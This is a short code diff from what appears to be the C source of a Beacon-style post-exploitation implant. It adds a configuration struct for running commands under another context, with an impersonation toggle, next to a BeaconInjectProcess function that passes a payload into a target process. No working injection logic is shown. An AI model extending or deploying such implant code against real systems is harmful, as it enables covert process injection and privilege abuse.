@@ -894,6 +894,16 @@ PRUN_UNDER_CONTEXT ChildProcessContextInit(PRUN_UNDER_CONTEXT context)
 	context->cleanup = CleanupChildProcessContext;
 	return context;
 }
+
+typedef struct _RUN_UNDER_CONFIG
+{
+	char* cmd;
+	int cmdLength;
+	STARTUPINFO* startupInfo;
+	PROCESS_INFORMATION* processInfo;
+	int creationFlags;
+	BOOL toggleImpersonation;
+} RUN_UNDER_CONFIG;
 void BeaconInjectProcess(HANDLE hProcess, int pid, char* payload, int p_len, int p_offset, char* arg, int a_len)
 {
 	BeaconInjectProcessInternal(NULL, hProcess, pid, payload, p_len, p_offset, arg, a_len);
